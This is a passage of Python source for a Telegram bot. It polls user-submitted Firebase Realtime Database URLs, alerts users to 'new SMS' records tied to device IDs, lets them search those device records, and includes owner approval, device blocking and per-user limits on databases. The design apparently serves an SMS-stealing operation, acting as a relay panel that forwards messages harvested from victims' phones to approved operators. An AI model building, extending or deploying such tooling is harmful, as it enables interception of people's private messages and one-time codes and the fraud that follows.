            f"🔗 <b>Unique Firebase URLs:</b> <code>{unique_firebase}</code>\n"
            f"📵 <b>Blocked Devices:</b> <code>{blocked_count}</code>\n"
            f"⏳ <b>Pending Permissions:</b> <code>{pending_count}</code>\n\n"
            f"⚙️ <b>System Limits:</b>\n"
            f"   • Max Firebase per user: <code>{MAX_FIREBASE_PER_USER}</code>\n"
            f"   • Cache refresh: <code>{CACHE_REFRESH_SECONDS}s</code>\n"
            f"   • Poll interval: <code>{POLL_INTERVAL}s</code>"
        )
        
        # User distribution
        user_dist = {}
        for uid, urls in firebase_urls.items():
            count = len(urls)
            user_dist[count] = user_dist.get(count, 0) + 1
        
        if user_dist:
            dist_text = "\n".join([f"   • {count} Firebase: {user_count} users" for count, user_count in sorted(user_dist.items())])
            stats_text += f"\n\n📈 <b>User Distribution:</b>\n{dist_text}"
        
        send_msg(chat_id, stats_text)
        return

    # -------- Owner-only approval commands --------
    if lower_text.startswith("/approve"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can approve users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/approve user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        approved_users.add(target_id)
        send_msg(chat_id, f"✅ User <code>{target_id}</code> approved.")
        send_msg(target_id, "✅ You have been approved to use this bot.\n\nSend /start to see available commands.")
        return

    if lower_text.startswith("/unapprove"):
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can unapprove users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/unapprove user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        if target_id in OWNER_IDS:
            send_msg(chat_id, "❌ Cannot unapprove an owner.")
            return
        if target_id in approved_users:
            approved_users.remove(target_id)
            stop_watcher_single(target_id)  # Stop their monitoring
            send_msg(chat_id, f"🚫 User <code>{target_id}</code> unapproved.")
            send_msg(target_id, "❌ Your access to this bot has been revoked.")
        else:
            send_msg(chat_id, f"ℹ️ User <code>{target_id}</code> was not approved.")
        return

    if lower_text == "/approvedlist":
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can see approved list.")
            return
        if not approved_users:
            send_msg(chat_id, "No approved users yet.")
            return
        lines = []
        for uid in sorted(approved_users):
            tag = " 👑" if uid in OWNER_IDS else ""
            active = "✅" if uid in firebase_urls else "❌"
            count = len(firebase_urls.get(uid, []))
            lines.append(f"{active} <code>{uid}</code> ({count} Firebase){tag}")
        send_msg(
            chat_id,
            "✅ <b>Approved Users</b>:\n\n" + "\n".join(lines),
        )
        return

    # -------- /find <device_id> (safe) --------
    if lower_text.startswith("/find"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            send_msg(chat_id, "Usage: <code>/find device_id</code>")
            return
        device_id = parts[1].strip()
        
        user_urls = firebase_urls.get(chat_id, [])
        if not user_urls:
            send_msg(
                chat_id,
                "❌ You don't have any active Firebase URL.\n"
                "First send your Firebase RTDB URL to start monitoring.",
            )
            return
        
        found_any = False
        for base_url in user_urls:
            json_url = normalize_json_url(base_url)
            snap = http_get_json(json_url)
            if snap is None:
                continue
            
            matches = search_records_by_device(snap, device_id)
            if matches:
                found_any = True
                max_show = 2
                for rec in matches[:max_show]:
                    send_msg(chat_id, f"🔍 Found in Firebase: <code>{base_url}</code>\n\n{safe_format_device_record(rec)}")
                if len(matches) > max_show:
                    send_msg(
                        chat_id,
                        f"ℹ️ {len(matches)} records matched in <code>{base_url}</code>, "
                        f"showing first {max_show} only.",
                    )
        
        if not found_any:
            send_msg(chat_id, "🔍 No record found for this device id in any of your Firebase URLs.")
        return

    # -------- Firebase URL handling with permission system --------
    if text.startswith("http"):
        # Check if URL is already in use by another user (except owners)
        if text in used_firebase_urls:
            # Check if current user is already using it
            if text in firebase_urls.get(chat_id, []):
                send_msg(chat_id, f"⚠️ You are already monitoring this Firebase URL: <code>{text}</code>")
                return
            
            # Check if admin is using it (admins can share URLs)
            admin_using = False
            for owner_id in OWNER_IDS:
                if owner_id in firebase_urls and text in firebase_urls[owner_id]:
                    admin_using = True
                    break
            
            if not admin_using and not is_owner(chat_id):
                send_msg(chat_id, f"❌ This Firebase URL is already in use by another user.\n\n<code>{text}</code>")
                return
        
        # Test the URL
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(
                chat_id,
                "❌ Unable to fetch URL. Make sure it's public and ends with .json",
            )
            return
        
        # Check permission or start directly
        if request_permission(chat_id, text):
            if start_watcher(chat_id, text):
                send_msg(
                    OWNER_IDS,
                    f"👤 User <code>{chat_id}</code> started monitoring:\n"
                    f"<code>{html.escape(text)}</code>",
                )
        return

    # /help command
    if lower_text == "/help":
        if is_owner(chat_id):
            help_text = (
                "📚 <b>Bot Help - All Commands</b>\n\n"
                "👤 <b>User Commands:</b>\n"
                "• <code>/start</code> - Show welcome message\n"
                "• <code>/stop</code> - Stop all monitoring\n"
                "• <code>/stop &lt;url&gt;</code> - Stop specific Firebase\n"
                "• <code>/list</code> - Show your Firebase URLs\n"
                "• <code>/find &lt;device_id&gt;</code> - Search device records\n"
                "• <code>/ping</code> - Check bot status & network speed\n"
                "• <code>/help</code> - Show this help\n\n"
                "👑 <b>Admin Commands:</b>\n"
                "• <code>/adminlist</code> - Show all Firebase URLs\n"
                "• <code>/approve &lt;user_id&gt;</code> - Approve user\n"
                "• <code>/unapprove &lt;user_id&gt;</code> - Remove approval\n"
                "• <code>/approvedlist</code> - List approved users\n"
                "• <code>/block &lt;device_id&gt;</code> - Block device\n"
                "• <code>/unblock &lt;device_id&gt;</code> - Unblock device\n"
                "• <code>/blockedlist</code> - Show blocked devices\n"
                "• <code>/stopall</code> - Stop all monitoring\n"
                "• <code>/broadcast &lt;message&gt;</code> - Broadcast message\n"
                "• <code>/stats</code> - Show bot statistics\n\n"
                "📝 <b>How to use:</b>\n"
                "1. Send Firebase RTDB URL to start monitoring\n"
                "2. Bot will notify you of new SMS\n"
                "3. You can monitor up to 5 Firebase URLs\n"
                "4. Contact admin for issues\n\n"
                "⚠️ <b>Note:</b> Each Firebase URL can only be used by one user at a time."
            )
        else:
            help_text = (
                "📚 <b>Bot Help - User Commands</b>\n\n"
                "👤 <b>Available Commands:</b>\n"
                "• <code>/start</code> - Show welcome message\n"
                "• <code>/stop</code> - Stop all monitoring\n"
                "• <code>/stop &lt;url&gt;</code> - Stop specific Firebase\n"
                "• <code>/list</code> - Show your Firebase URLs\n"
                "• <code>/find &lt;device_id&gt;</code> - Search device records\n"
                "• <code>/ping</code> - Check bot status & network speed\n"
                "• <code>/help</code> - Show this help\n\n"
                "📝 <b>How to use:</b>\n"
                "1. Send Firebase RTDB URL to start monitoring\n"
                "2. Bot will notify you of new SMS\n"
                "3. You can monitor up to 5 Firebase URLs\n"
                "4. Contact admin for issues\n\n"
                "⚠️ <b>Note:</b> Each Firebase URL can only be used by one user at a time."
            )
        
        send_msg(chat_id, help_text)
        return

    # Fallback for unknown commands
    send_msg(
        chat_id,
        "❓ <b>Unknown Command</b>\n\n"
        "Send <code>/start</code> to see available commands.\n"
        "Send <code>/help</code> for detailed help.\n\n"
        "Or send a Firebase RTDB URL to start monitoring."
    )


# ---------- MAIN LOOP ----------
def main_loop():
    send_msg(OWNER_IDS, "🤖 Bot started and running.")
    print("Bot running. Listening for messages...")
    global running
    while running:
        updates = get_updates()
        for u in updates:
            try:
                handle_update(u)
            except Exception as e:
                print("handle_update error:", e)
        time.sleep(0.5)


if __name__ == "__main__":
    try:
        # Start cache refresher thread
        threading.Thread(target=cache_refresher_loop, daemon=True).start()
        print("✅ Cache refresher thread started.")
        
        # Start main loop
        main_loop()
    except KeyboardInterrupt:
        running = False
        print("Shutting down.")
    except Exception as e:
        print(f"Fatal error: {e}")
        send_msg(OWNER_IDS, f"❌ Bot crashed: {str(e)}")